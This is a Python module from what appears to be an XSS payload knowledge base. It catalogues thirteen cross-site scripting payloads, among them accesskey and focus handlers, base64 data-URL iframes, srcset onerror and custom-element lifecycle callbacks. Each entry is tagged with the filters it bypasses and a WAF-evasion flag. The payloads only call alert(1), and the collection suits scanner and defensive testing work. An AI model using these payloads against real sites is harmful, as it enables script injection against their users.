#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Deep Memory XSS Payloads - Part 2
Obscure attribute injections, Data URLs, Srcset/Sizes, Slot/Template, and Web Component lifecycle.
"""

from ..models import PayloadEntry


BRS_KB_DEEP_MEMORY_PAYLOADS_PART2 = {
    # ============================================================
    # OBSCURE ATTRIBUTE INJECTIONS
    # ============================================================
    "attr-accesskey": PayloadEntry(
        payload='<a accesskey="x" onclick="alert(1)">Alt+X</a>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Accesskey triggered by keyboard",
        tags=["attribute", "accesskey"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "attr-contenteditable": PayloadEntry(
        payload='<div contenteditable="true" onfocus="alert(1)">edit</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Contenteditable focus trigger",
        tags=["attribute", "contenteditable"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "attr-tabindex-focus": PayloadEntry(
        payload='<div tabindex="0" onfocus="alert(1)">tab to me</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Tabindex enables focus event",
        tags=["attribute", "tabindex"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "attr-enterkeyhint": PayloadEntry(
        payload='<input enterkeyhint="done" onkeypress="alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Enterkeyhint mobile keyboard",
        tags=["attribute", "enterkeyhint", "mobile"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "safari"],
        reliability="medium",
    ),
    # ============================================================
    # BASE64/DATA URL TRICKS
    # ============================================================
    "data-url-html-base64": PayloadEntry(
        payload='<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Data URL with base64 HTML",
        tags=["data", "base64", "iframe"],
        bypasses=["src_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "data-url-svg-base64": PayloadEntry(
        payload='<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Data URL with base64 SVG",
        tags=["data", "base64", "svg"],
        bypasses=["src_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "data-url-charset": PayloadEntry(
        payload='<iframe src="data:text/html;charset=utf-8,<script>alert(1)</script>">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Data URL with charset",
        tags=["data", "charset", "iframe"],
        bypasses=["src_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # SRCSET/SIZES EXPLOITATION
    # ============================================================
    "srcset-onerror": PayloadEntry(
        payload='<img srcset="x" onerror="alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Srcset attribute onerror",
        tags=["srcset", "onerror"],
        bypasses=["src_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "picture-source": PayloadEntry(
        payload='<picture><source srcset="x" onerror="alert(1)"><img></picture>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Picture source onerror",
        tags=["picture", "source", "onerror"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # SLOT/TEMPLATE EXPLOITATION
    # ============================================================
    "slot-fallback": PayloadEntry(
        payload='<template id=t><slot name=x><img src=x onerror="alert(1)"></slot></template>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Slot fallback content XSS",
        tags=["slot", "template", "fallback"],
        bypasses=["template_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # WEB COMPONENT LIFECYCLE
    # ============================================================
    "custom-element-connected": PayloadEntry(
        payload='<script>customElements.define("x-x",class extends HTMLElement{connectedCallback(){alert(1)}})</script><x-x>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Custom element connectedCallback",
        tags=["webcomponent", "lifecycle"],
        bypasses=["script_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "custom-element-adopted": PayloadEntry(
        payload='<script>customElements.define("x-x",class extends HTMLElement{adoptedCallback(){alert(1)}})</script><x-x>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Custom element adoptedCallback",
        tags=["webcomponent", "lifecycle"],
        bypasses=["script_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "custom-element-attribute": PayloadEntry(
        payload='<script>customElements.define("x-x",class extends HTMLElement{static observedAttributes=["x"];attributeChangedCallback(){alert(1)}})</script><x-x x>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Custom element attributeChangedCallback",
        tags=["webcomponent", "lifecycle"],
        bypasses=["script_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
}
